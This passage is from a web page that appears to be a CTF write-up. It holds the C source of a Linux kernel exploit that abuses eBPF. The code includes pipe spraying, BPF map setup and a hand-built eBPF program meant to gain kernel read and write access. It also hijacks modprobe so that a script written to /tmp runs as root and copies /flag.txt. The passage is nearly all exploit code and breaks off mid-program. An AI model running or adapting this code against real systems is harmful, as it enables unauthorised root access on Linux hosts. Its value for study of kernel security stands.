class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/libbpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_alg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_insn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> map_fd1;</span><br><span class="line"><span class="type">int</span> map_fd2;</span><br><span class="line"><span class="type">int</span> prog_fd;</span><br><span class="line"><span class="type">uint32_t</span> key;</span><br><span class="line"><span class="type">uint64_t</span>* value1;</span><br><span class="line"><span class="type">uint64_t</span>* value2;</span><br><span class="line"><span class="type">char</span> trigger_buf[<span class="number">0x2000</span>];</span><br><span class="line"><span class="type">int64_t</span> buf[<span class="number">0x2000</span>/<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_VICTIM_READ_BY_ADDRESS 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_VICTIM_WRITE_BY_ADDRESS 0xdeaf</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_VICTIM_READ_BY_2BYTES 0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x20</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pipes_resize</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pipe buffer resize&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">128</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pipe_buffer_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pipe buffer init&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger_modprobe</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_alg</span> <span class="title">sa</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> alg_fd = socket(AF_ALG, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (alg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;socket(AF_ALG) failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.salg_family = AF_ALG;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)sa.salg_type, <span class="string">&quot;Qanux&quot;</span>);  <span class="comment">// dummy string</span></span><br><span class="line">    bind(alg_fd, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_flag</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland, setting up for fake modprobe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag\ncat /flag.txt&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_modprobe(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/tmp/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose...&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        read(fd, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] flag: %s&quot;</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="keyword">sizeof</span>(*attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_map_create</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> map_type, <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">               <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type = map_type,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_bpf_array_of_map</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> key_size, <span class="type">int</span> value_size, <span class="type">int</span> max_entries)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY_OF_MAPS,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries,</span><br><span class="line">        .inner_map_fd = fd,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_map_lookup_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">const</span> <span class="type">void</span>* key, <span class="type">void</span>* value)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>)key,</span><br><span class="line">        .value = (<span class="type">uint64_t</span>)value,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_map_update_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">const</span> <span class="type">void</span>* key, <span class="type">const</span> <span class="type">void</span>* value, <span class="type">uint64_t</span> flags)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>)key,</span><br><span class="line">        .value = (<span class="type">uint64_t</span>)value,</span><br><span class="line">        .flags = flags,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_map_delete_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">const</span> <span class="type">void</span>* key)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>)key,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_map_get_next_key</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">const</span> <span class="type">void</span>* key, <span class="type">void</span>* next_key)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>)key,</span><br><span class="line">        .next_key = (<span class="type">uint64_t</span>)next_key,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">bpf_map_get_info_by_fd</span><span class="params">(<span class="type">int</span> map_fd)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .info.bpf_fd = map_fd,</span><br><span class="line">        .info.info_len = <span class="keyword">sizeof</span>(info),</span><br><span class="line">        .info.info = (<span class="type">uint64_t</span>)&amp;info,</span><br><span class="line">    &#125;;</span><br><span class="line">    bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);</span><br><span class="line">    <span class="keyword">return</span> info.btf_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="type">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load6</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type type,</span></span><br><span class="line"><span class="params">				  <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insns, <span class="type">int</span> insn_cnt,</span></span><br><span class="line"><span class="params">				  <span class="type">const</span> <span class="type">char</span> *license)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.prog_type = type,</span><br><span class="line">		.insns = (<span class="type">size_t</span>)(insns),</span><br><span class="line">		.insn_cnt = insn_cnt,</span><br><span class="line">		.license = (<span class="type">size_t</span>)(license),</span><br><span class="line">		.log_buf = (<span class="type">size_t</span>)(bpf_log_buf),</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(SYS_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),                            <span class="comment">// r7 = ctx</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, <span class="number">83</span>),                                   <span class="comment">// r1 = [map_fd1]</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_6, <span class="number">0</span>),                                    <span class="comment">// r6 = 0</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, <span class="number">-8</span>),                 <span class="comment">// *(fp -8) = 0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                           <span class="comment">// r2 = fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-8</span>),                          <span class="comment">// r2 = fp - 8</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP|BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem), <span class="comment">// args: r1 = bpf_map1 ptr, r2 = fp - 8</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),                          <span class="comment">// if r0 &lt;= r0 goto pc+1 right</span></span><br><span class="line">    BPF_EXIT_INSN(),                                                <span class="comment">// exit</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                            <span class="comment">// r9 = value1 ptr</span></span><br><span class="line"></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, <span class="number">84</span>),                                   <span class="comment">// r1 = [map_fd2]</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_5, <span class="number">0</span>),                                    <span class="comment">// r5 = 0</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, <span class="number">-8</span>),                 <span class="comment">// *(fp -8) = 0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                           <span class="comment">// r2 = fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-8</span>),                          <span class="comment">// r2 = fp - 8</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP|BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem), <span class="comment">// args: r1 = bpf_map2 ptr, r2 = fp - 8</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),                          <span class="comment">// if r0 &lt;= r0 goto pc+1 right</span></span><br><span class="line">    BPF_EXIT_INSN(),                                                <span class="comment">// exit</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                            <span class="comment">// r8 = value2 ptr</span></span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_9, <span class="number">-8</span>),                 <span class="comment">// *(fp -8) = value1 ptr</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV32_IMM(BPF_REG_6, <span class="number">0x2</span>),                                  <span class="comment">// R6 = 0x2</span></span><br><span class="line">    BPF_ALU32_IMM(<span class="number">224</span>, BPF_REG_6, <span class="number">31</span>),                              <span class="comment">// R6 &lt;&lt; 31</span></span><br><span class="line">    